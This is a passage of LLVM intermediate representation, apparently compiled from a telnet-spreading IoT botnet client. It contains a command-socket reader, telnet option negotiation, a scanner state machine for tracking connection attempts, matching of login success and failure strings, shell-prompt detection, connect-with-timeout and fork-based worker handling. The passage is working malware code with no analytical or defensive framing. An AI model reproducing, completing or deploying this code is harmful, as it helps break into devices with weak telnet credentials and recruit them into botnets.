  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #2, !srcloc !1
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %37
  store i64 %44, i64* %42, align 8
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  %47 = call i32 @select(i32 %46, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %47, i32* %12, align 4
  %48 = icmp sle i32 %47, 0
  br i1 %48, label %49, label %86

; <label>:49:                                     ; preds = %33
  br label %50

; <label>:50:                                     ; preds = %81, %49
  %51 = load i32, i32* %13, align 4
  %52 = icmp slt i32 %51, 10
  br i1 %52, label %53, label %85

; <label>:53:                                     ; preds = %50
  %54 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %54, align 8
  %55 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %55, align 8
  br label %56

; <label>:56:                                     ; preds = %53
  %57 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %58 = getelementptr inbounds [16 x i64], [16 x i64]* %57, i64 0, i64 0
  %59 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %58) #2, !srcloc !2
  %60 = extractvalue { i64, i64* } %59, 0
  %61 = extractvalue { i64, i64* } %59, 1
  %62 = trunc i64 %60 to i32
  store i32 %62, i32* %14, align 4
  %63 = ptrtoint i64* %61 to i64
  %64 = trunc i64 %63 to i32
  store i32 %64, i32* %15, align 4
  br label %65

; <label>:65:                                     ; preds = %56
  %66 = load i32, i32* %5, align 4
  %67 = srem i32 %66, 64
  %68 = zext i32 %67 to i64
  %69 = shl i64 1, %68
  %70 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %71 = load i32, i32* %5, align 4
  %72 = sdiv i32 %71, 64
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds [16 x i64], [16 x i64]* %70, i64 0, i64 %73
  %75 = load i64, i64* %74, align 8
  %76 = or i64 %75, %69
  store i64 %76, i64* %74, align 8
  %77 = load i32, i32* %5, align 4
  %78 = add nsw i32 %77, 1
  %79 = call i32 @select(i32 %78, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %79, i32* %12, align 4
  %80 = icmp sle i32 %79, 0
  br i1 %80, label %81, label %84

; <label>:81:                                     ; preds = %65
  %82 = load i32, i32* %13, align 4
  %83 = add nsw i32 %82, 1
  store i32 %83, i32* %13, align 4
  br label %50

; <label>:84:                                     ; preds = %65
  br label %85

; <label>:85:                                     ; preds = %84, %50
  br label %86

; <label>:86:                                     ; preds = %85, %33
  store i32 0, i32* %18, align 4
  %87 = load i8*, i8** %6, align 8
  store i8* %87, i8** %17, align 8
  br label %88

; <label>:88:                                     ; preds = %106, %86
  %89 = load i32, i32* %7, align 4
  %90 = add nsw i32 %89, -1
  store i32 %90, i32* %7, align 4
  %91 = icmp sgt i32 %89, 1
  br i1 %91, label %92, label %109

; <label>:92:                                     ; preds = %88
  %93 = load i32, i32* @HeliosCommSock, align 4
  %94 = call i64 @recv(i32 %93, i8* %16, i64 1, i32 0)
  %95 = icmp ne i64 %94, 1
  br i1 %95, label %96, label %98

; <label>:96:                                     ; preds = %92
  %97 = load i8*, i8** %17, align 8
  store i8 0, i8* %97, align 1
  store i32 -1, i32* %4, align 4
  br label %112

; <label>:98:                                     ; preds = %92
  %99 = load i8, i8* %16, align 1
  %100 = load i8*, i8** %17, align 8
  %101 = getelementptr inbounds i8, i8* %100, i32 1
  store i8* %101, i8** %17, align 8
  store i8 %99, i8* %100, align 1
  %102 = load i8, i8* %16, align 1
  %103 = zext i8 %102 to i32
  %104 = icmp eq i32 %103, 10
  br i1 %104, label %105, label %106

; <label>:105:                                    ; preds = %98
  br label %109

; <label>:106:                                    ; preds = %98
  %107 = load i32, i32* %18, align 4
  %108 = add nsw i32 %107, 1
  store i32 %108, i32* %18, align 4
  br label %88

; <label>:109:                                    ; preds = %105, %88
  %110 = load i8*, i8** %17, align 8
  store i8 0, i8* %110, align 1
  %111 = load i32, i32* %18, align 4
  store i32 %111, i32* %4, align 4
  br label %112

; <label>:112:                                    ; preds = %109, %96
  %113 = load i32, i32* %4, align 4
  ret i32 %113
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #3

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  %3 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 1
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %6, i32* %7, align 4
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = call i8* @inet_ntoa(i32 %9) #2
  ret i8* %10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8**) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i32 %1, i32* %8, align 4
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i8** %4, i8*** %11, align 8
  %14 = load i8*, i8** %9, align 8
  %15 = load i32, i32* %10, align 4
  %16 = sext i32 %15 to i64
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 %16, i32 1, i1 false)
  %17 = load i32, i32* %7, align 4
  %18 = load i32, i32* %8, align 4
  %19 = load i8*, i8** %9, align 8
  %20 = load i32, i32* %10, align 4
  %21 = call i32 @read_with_timeout(i32 %17, i32 %18, i8* %19, i32 %20)
  store i32 %21, i32* %12, align 4
  %22 = load i8*, i8** %9, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 0
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  %26 = icmp eq i32 %25, 255
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %5
  %28 = load i32, i32* %7, align 4
  %29 = load i8*, i8** %9, align 8
  %30 = call i32 @negotiate(i32 %28, i8* %29, i32 3)
  br label %31

; <label>:31:                                     ; preds = %27, %5
  %32 = load i8*, i8** %9, align 8
  %33 = load i8**, i8*** %11, align 8
  %34 = call i32 @contains_string(i8* %32, i8** %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %31
  store i32 1, i32* %6, align 4
  br label %38

; <label>:37:                                     ; preds = %31
  store i32 0, i32* %6, align 4
  br label %38

; <label>:38:                                     ; preds = %37, %36
  %39 = load i32, i32* %6, align 4
  ret i32 %39
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.__sigset_t, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 0, i64* %14, align 8
  %15 = load i32, i32* %7, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 %16, i64* %17, align 8
  br label %18

; <label>:18:                                     ; preds = %4
  %19 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %20 = getelementptr inbounds [16 x i64], [16 x i64]* %19, i64 0, i64 0
  %21 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %20) #2, !srcloc !3
  %22 = extractvalue { i64, i64* } %21, 0
  %23 = extractvalue { i64, i64* } %21, 1
  %24 = trunc i64 %22 to i32
  store i32 %24, i32* %12, align 4
  %25 = ptrtoint i64* %23 to i64
  %26 = trunc i64 %25 to i32
  store i32 %26, i32* %13, align 4
  br label %27

; <label>:27:                                     ; preds = %18
  %28 = load i32, i32* %6, align 4
  %29 = srem i32 %28, 64
  %30 = zext i32 %29 to i64
  %31 = shl i64 1, %30
  %32 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %33 = load i32, i32* %6, align 4
  %34 = sdiv i32 %33, 64
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [16 x i64], [16 x i64]* %32, i64 0, i64 %35
  %37 = load i64, i64* %36, align 8
  %38 = or i64 %37, %31
  store i64 %38, i64* %36, align 8
  %39 = load i32, i32* %6, align 4
  %40 = add nsw i32 %39, 1
  %41 = call i32 @select(i32 %40, %struct.__sigset_t* %10, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %11)
  %42 = icmp slt i32 %41, 1
  br i1 %42, label %43, label %44

; <label>:43:                                     ; preds = %27
  store i32 0, i32* %5, align 4
  br label %51

; <label>:44:                                     ; preds = %27
  %45 = load i32, i32* %6, align 4
  %46 = load i8*, i8** %8, align 8
  %47 = load i32, i32* %9, align 4
  %48 = sext i32 %47 to i64
  %49 = call i64 @recv(i32 %45, i8* %46, i64 %48, i32 0)
  %50 = trunc i64 %49 to i32
  store i32 %50, i32* %5, align 4
  br label %51

; <label>:51:                                     ; preds = %44, %43
  %52 = load i32, i32* %5, align 4
  ret i32 %52
}

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %61 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

; <label>:13:                                     ; preds = %3
  store i32 0, i32* %4, align 4
  br label %63

; <label>:14:                                     ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 %15, i8* %8, i64 1, i32 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %54

; <label>:23:                                     ; preds = %14
  %24 = load i8*, i8** %6, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 1
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 254, %27
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %23
  store i8 -4, i8* %8, align 1
  br label %53

; <label>:30:                                     ; preds = %23
  %31 = load i8*, i8** %6, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 3, %34
  br i1 %35, label %36, label %44

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %6, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 253
  %42 = select i1 %41, i32 251, i32 253
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %8, align 1
  br label %52

; <label>:44:                                     ; preds = %30
  %45 = load i8*, i8** %6, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 253
  %50 = select i1 %49, i32 252, i32 254
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %8, align 1
  br label %52

; <label>:52:                                     ; preds = %44, %36
  br label %53

; <label>:53:                                     ; preds = %52, %29
  br label %54

; <label>:54:                                     ; preds = %53, %22
  %55 = load i32, i32* %5, align 4
  %56 = call i64 @send(i32 %55, i8* %8, i64 1, i32 16384)
  %57 = load i32, i32* %5, align 4
  %58 = load i8*, i8** %6, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 2
  %60 = call i64 @send(i32 %57, i8* %59, i64 1, i32 16384)
  br label %62

; <label>:61:                                     ; preds = %3
  br label %62

; <label>:62:                                     ; preds = %61, %54
  store i32 0, i32* %4, align 4
  br label %63

; <label>:63:                                     ; preds = %62, %13
  %64 = load i32, i32* %4, align 4
  ret i32 %64
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %8

; <label>:8:                                      ; preds = %16, %2
  %9 = load i8**, i8*** %5, align 8
  %10 = load i32, i32* %6, align 4
  %11 = add nsw i32 %10, 1
  store i32 %11, i32* %6, align 4
  %12 = sext i32 %11 to i64
  %13 = getelementptr inbounds i8*, i8** %9, i64 %12
  %14 = load i8*, i8** %13, align 8
  %15 = icmp ne i8* %14, null
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %8
  br label %8

; <label>:17:                                     ; preds = %8
  store i32 0, i32* %7, align 4
  br label %18

; <label>:18:                                     ; preds = %33, %17
  %19 = load i32, i32* %7, align 4
  %20 = load i32, i32* %6, align 4
  %21 = icmp slt i32 %19, %20
  br i1 %21, label %22, label %36

; <label>:22:                                     ; preds = %18
  %23 = load i8*, i8** %4, align 8
  %24 = load i8**, i8*** %5, align 8
  %25 = load i32, i32* %7, align 4
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds i8*, i8** %24, i64 %26
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %23, i8* %28)
  %30 = icmp ne i32 %29, 0
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %22
  store i32 1, i32* %3, align 4
  br label %37

; <label>:32:                                     ; preds = %22
  br label %33

; <label>:33:                                     ; preds = %32
  %34 = load i32, i32* %7, align 4
  %35 = add nsw i32 %34, 1
  store i32 %35, i32* %7, align 4
  br label %18

; <label>:36:                                     ; preds = %18
  store i32 0, i32* %3, align 4
  br label %37

; <label>:37:                                     ; preds = %36, %31
  %38 = load i32, i32* %3, align 4
  ret i32 %38
}

declare i32 @strcasestr(...) #3

; Function Attrs: noinline nounwind uwtable
define void @advance_state(%struct.telstate_t*, i32) #0 {
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  %6 = icmp eq i32 %5, 0
  br i1 %6, label %7, label %12

; <label>:7:                                      ; preds = %2
  %8 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %9 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %8, i32 0, i32 0
  %10 = load i32, i32* %9, align 8
  %11 = call i32 @close(i32 %10)
  br label %12

; <label>:12:                                     ; preds = %7, %2
  %13 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %14 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %13, i32 0, i32 7
  store i32 0, i32* %14, align 8
  %15 = load i32, i32* %4, align 4
  %16 = trunc i32 %15 to i8
  %17 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %18 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i32 0, i32 2
  store i8 %16, i8* %18, align 8
  %19 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %20 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i32 0, i32 9
  %21 = load i8*, i8** %20, align 8
  call void @llvm.memset.p0i8.i64(i8* %21, i8 0, i64 1024, i32 1, i1 false)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %3 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  call void @advance_state(%struct.telstate_t* %3, i32 0)
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 3
  store i8 1, i8* %5, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([4 x i8*], [4 x i8*]* @successes, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([8 x i8*], [8 x i8*]* @fails, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_success(i8* %3)
  %5 = icmp ne i32 %4, 0
  br i1 %5, label %10, label %6

; <label>:6:                                      ; preds = %1
  %7 = load i8*, i8** %2, align 8
  %8 = call i32 @contains_fail(i8* %7)
  %9 = icmp ne i32 %8, 0
  br label %10

; <label>:10:                                     ; preds = %6, %1
  %11 = phi i1 [ true, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #13
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %100

; <label>:37:                                     ; preds = %4
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %38, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 8, i32 4, i1 false)
  %40 = load i32, i32* %6, align 4
  %41 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  store i32 %42, i32* %16, align 4
  %43 = load i32, i32* %16, align 4
  %44 = icmp slt i32 %43, 0
  br i1 %44, label %45, label %91

; <label>:45:                                     ; preds = %37
  %46 = call i32* @__errno_location() #13
  %47 = load i32, i32* %46, align 4
  %48 = icmp eq i32 %47, 115
  br i1 %48, label %49, label %89

; <label>:49:                                     ; preds = %45
  %50 = load i32, i32* %9, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %51, i64* %52, align 8
  %53 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %53, align 8
  br label %54

; <label>:54:                                     ; preds = %49
  %55 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %56 = getelementptr inbounds [16 x i64], [16 x i64]* %55, i64 0, i64 0
  %57 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %56) #2, !srcloc !4
  %58 = extractvalue { i64, i64* } %57, 0
  %59 = extractvalue { i64, i64* } %57, 1
  %60 = trunc i64 %58 to i32
  store i32 %60, i32* %17, align 4
  %61 = ptrtoint i64* %59 to i64
  %62 = trunc i64 %61 to i32
  store i32 %62, i32* %18, align 4
  br label %63

; <label>:63:                                     ; preds = %54
  %64 = load i32, i32* %6, align 4
  %65 = srem i32 %64, 64
  %66 = zext i32 %65 to i64
  %67 = shl i64 1, %66
  %68 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %69 = load i32, i32* %6, align 4
  %70 = sdiv i32 %69, 64
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds [16 x i64], [16 x i64]* %68, i64 0, i64 %71
  %73 = load i64, i64* %72, align 8
  %74 = or i64 %73, %67
  store i64 %74, i64* %72, align 8
  %75 = load i32, i32* %6, align 4
  %76 = add nsw i32 %75, 1
  %77 = call i32 @select(i32 %76, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %78 = icmp sgt i32 %77, 0
  br i1 %78, label %79, label %87

; <label>:79:                                     ; preds = %63
  store i32 4, i32* %13, align 4
  %80 = load i32, i32* %6, align 4
  %81 = bitcast i32* %14 to i8*
  %82 = call i32 @getsockopt(i32 %80, i32 1, i32 4, i8* %81, i32* %13) #2
  %83 = load i32, i32* %14, align 4
  %84 = icmp ne i32 %83, 0
  br i1 %84, label %85, label %86

; <label>:85:                                     ; preds = %79
  store i32 0, i32* %5, align 4
  br label %100

; <label>:86:                                     ; preds = %79
  br label %88

; <label>:87:                                     ; preds = %63
  store i32 0, i32* %5, align 4
  br label %100

; <label>:88:                                     ; preds = %86
  br label %90

; <label>:89:                                     ; preds = %45
  store i32 0, i32* %5, align 4
  br label %100

; <label>:90:                                     ; preds = %88
  br label %91

; <label>:91:                                     ; preds = %90, %37
  %92 = load i32, i32* %6, align 4
  %93 = call i32 (i32, i32, ...) @fcntl(i32 %92, i32 3, i8* null)
  %94 = sext i32 %93 to i64
  store i64 %94, i64* %15, align 8
  %95 = load i64, i64* %15, align 8
  %96 = and i64 %95, -2049
  store i64 %96, i64* %15, align 8
  %97 = load i32, i32* %6, align 4
  %98 = load i64, i64* %15, align 8
  %99 = call i32 (i32, i32, ...) @fcntl(i32 %97, i32 4, i64 %98)
  store i32 1, i32* %5, align 4
  br label %100

; <label>:100:                                    ; preds = %91, %89, %87, %85, %36
  %101 = load i32, i32* %5, align 4
  ret i32 %101
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #2
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %47

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = add i64 %11, 1
  store i64 %12, i64* @numpids, align 8
  %13 = load i64, i64* @numpids, align 8
  %14 = add i64 %13, 1
  %15 = mul i64 %14, 4
  %16 = call noalias i8* @malloc(i64 %15) #2
  %17 = bitcast i8* %16 to i32*
  store i32* %17, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %18

; <label>:18:                                     ; preds = %34, %10
  %19 = load i32, i32* %4, align 4
  %20 = zext i32 %19 to i64
  %21 = load i64, i64* @numpids, align 8
  %22 = sub i64 %21, 1
  %23 = icmp ult i64 %20, %22
  br i1 %23, label %24, label %37

; <label>:24:                                     ; preds = %18
  %25 = load i32*, i32** @pids, align 8
  %26 = load i32, i32* %4, align 4
  %27 = zext i32 %26 to i64
  %28 = getelementptr inbounds i32, i32* %25, i64 %27
  %29 = load i32, i32* %28, align 4
  %30 = load i32*, i32** %3, align 8
  %31 = load i32, i32* %4, align 4
  %32 = zext i32 %31 to i64
  %33 = getelementptr inbounds i32, i32* %30, i64 %32
  store i32 %29, i32* %33, align 4
  br label %34

; <label>:34:                                     ; preds = %24
  %35 = load i32, i32* %4, align 4
  %36 = add i32 %35, 1
  store i32 %36, i32* %4, align 4
  br label %18

; <label>:37:                                     ; preds = %18
  %38 = load i32, i32* %2, align 4
  %39 = load i32*, i32** %3, align 8
  %40 = load i64, i64* @numpids, align 8
  %41 = sub i64 %40, 1
  %42 = getelementptr inbounds i32, i32* %39, i64 %41
  store i32 %38, i32* %42, align 4
  %43 = load i32*, i32** @pids, align 8
  %44 = bitcast i32* %43 to i8*
  call void @free(i8* %44) #2
  %45 = load i32*, i32** %3, align 8
  store i32* %45, i32** @pids, align 8
  %46 = load i32, i32* %2, align 4
  store i32 %46, i32* %1, align 4
  br label %47

; <label>:47:                                     ; preds = %37, %8
  %48 = load i32, i32* %1, align 4
  ret i32 %48
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.345, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #10
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

; <label>:11:                                     ; preds = %97, %1
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #10
  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %100

; <label>:17:                                     ; preds = %11
